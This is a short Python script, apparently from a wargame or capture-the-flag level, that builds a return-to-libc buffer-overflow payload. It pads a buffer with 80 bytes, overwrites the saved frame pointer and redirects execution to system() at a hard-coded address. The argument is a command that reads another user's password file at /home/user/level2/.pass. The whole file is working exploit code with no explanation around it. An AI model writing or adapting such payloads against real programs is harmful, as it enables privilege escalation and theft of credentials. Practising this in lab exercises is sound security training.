import struct

# Addresses
system_addr = 0x8048360  # Address of system@plt
cmd_addr = 0xbffff6f0    # Address where the command will be in the buffer

# Construct payload
payload = b"A" * 80       # Fill buffer
payload += b"B" * 4       # Overwrite saved EBP
payload += struct.pack("<I", system_addr)  # Address of system@plt
payload += struct.pack("<I", 0x0)         # Dummy return address for system (can be 0)
payload += struct.pack("<I", cmd_addr)    # Argument to system (address of the command)

# Append the command
payload += b"cat /home/user/level2/.pass\x00"

print(payload)
